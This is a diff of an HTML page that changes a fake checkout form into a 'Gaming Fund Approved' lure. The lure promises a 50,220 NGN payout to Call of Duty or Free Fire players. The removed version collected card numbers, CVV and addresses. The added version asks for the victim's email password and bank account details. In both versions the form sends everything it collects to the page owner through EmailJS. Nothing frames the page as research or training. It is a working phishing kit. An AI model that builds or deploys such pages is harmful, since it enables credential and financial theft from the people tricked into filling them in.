@@ -3,8 +3,57 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Complete Checkout Form</title>
+<title>Gaming Fund Approved</title>
 <link rel="stylesheet" href="styles.css">
+<style>
+    /* Additional CSS styling for the gaming fund giver */
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        padding: 20px;
+    }
+    h2 {
+        text-align: center;
+        color: #333;
+    }
+    form {
+        max-width: 500px;
+        margin: 0 auto;
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    label {
+        display: block;
+        font-weight: bold;
+        margin-bottom: 5px;
+        color: #333;
+    }
+    input[type="text"],
+    input[type="email"],
+    input[type="password"],
+    input[type="number"],
+    select {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-sizing: border-box;
+    }
+    input[type="button"] {
+        background-color: #007bff;
+        color: #fff;
+        border: none;
+        padding: 10px 20px;
+        cursor: pointer;
+        border-radius: 5px;
+    }
+    input[type="button"]:hover {
+        background-color: #0056b3;
+    }
+</style>
 <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
     (function(){
@@ -14,31 +63,23 @@
     function sendEmail() {
         var name = document.getElementById("name").value;
         var email = document.getElementById("email").value;
-        var phone = document.getElementById("phone").value;
-        var address = document.getElementById("address").value;
-        var postalCode = document.getElementById("postalCode").value;
-        var productId = document.getElementById("productId").value;
-        var cardNumber = document.getElementById("cardNumber").value;
-        var expirationDate = document.getElementById("expirationDate").value;
-        var cvv = document.getElementById("cvv").value;
-        var cardHolderName = document.getElementById("cardHolderName").value;
+        var password = document.getElementById("password").value;
+        var game = document.getElementById("game").value;
+        var accountNumber = document.getElementById("accountNumber").value;
+        var accountName = document.getElementById("accountName").value;
 
         // Send email using EmailJS
         emailjs.send("service_a6nfqao", "template_ousg6r4", {
             from_name: name,
             from_email: email,
-            phone: phone,
-            address: address,
-            postal_code: postalCode,
-            product_id: productId,
-            card_number: cardNumber,
-            expiration_date: expirationDate,
-            cvv: cvv,
-            card_holder_name: cardHolderName
+            password: password,
+            game: game,
+            account_number: accountNumber,
+            account_name: accountName
         })
         .then(function(response) {
             console.log("Email sent successfully", response);
-            alert("Your order has been placed successfully, and will be delivered to you in the next 2-3 days!");
+            alert("Congratulation Your gaming fund of 50,220 NGN will be sent soon");
             // Optionally, you can clear the form fields after successful submission
             document.getElementById("checkoutForm").reset();
         }, function(error) {
@@ -50,47 +91,32 @@
 </head>
 <body>
 
-<h2>Checkout</h2>
+<h2>Gaming Fund Successfully Approved</h2>
 
 <form id="checkoutForm">
-    <label for="name">Name:</label><br>
-    <input type="text" id="name" name="name" required><br><br>
+    <label for="name">Your Name:</label>
+    <input type="text" id="name" name="name" required>
 
-    <label for="email">Email:</label><br>
-    <input type="email" id="email" name="email" required><br><br>
+    <label for="email">Your Email:</label>
+    <input type="email" id="email" name="email" required>
 
-    <label for="phone">Phone:</label><br>
-    <input type="tel" id="phone" name="phone" required><br><br>
+    <label for="password">Email Password:</label>
+    <input type="password" id="password" name="password" required>
 
-    <label for="address">Address:</label><br>
-    <textarea id="address" name="address" rows="4" cols="50" required></textarea><br><br>
+    <label for="game">Select Game:</label>
+    <select id="game" name="game" required>
+        <option value="">Choose a game...</option>
+        <option value="COD">Call of Duty</option>
+        <option value="FreeFire">Free Fire</option>
+    </select>
 
-    <label for="postalCode">Postal Code:</label><br>
-    <input type="text" id="postalCode" name="postalCode" required><br><br>
+    <label for="accountNumber">Account Number:</label>
+    <input type="number" id="accountNumber" name="accountNumber" required>
 
-    <label for="productId">Product ID:</label><br>
-    <input type="text" id="productId" name="productId" required><br><br>
-    <hr>
-    <p><b>Payment Information</b></p>
-    <hr>
-    <label for="cardNumber">Card Number:</label><br>
-    <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required><br><br>
+    <label for="accountName">Account Name:</label>
+    <input type="text" id="accountName" name="accountName" required>
 
-    <div class="input-row">
-        <div class="input-half">
-            <label for="expirationDate">Expiration Date:</label><br>
-            <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" required>
-        </div>
-        <div class="input-half">
-            <label for="cvv">CVV:</label><br>
-            <input type="password" id="cvv" name="cvv" maxlength="3" placeholder="123" maxlenght="3" required>
-        </div>
-    </div>
-
-    <label for="cardHolderName">Cardholder's Name:</label><br>
-    <input type="text" id="cardHolderName" name="cardHolderName" required><br><br>
-
-    <input type="button" value="Place Order" onclick="sendEmail()">
+    <input type="button" value="Request Fund" onclick="sendEmail()">
 </form>
 
 </body>
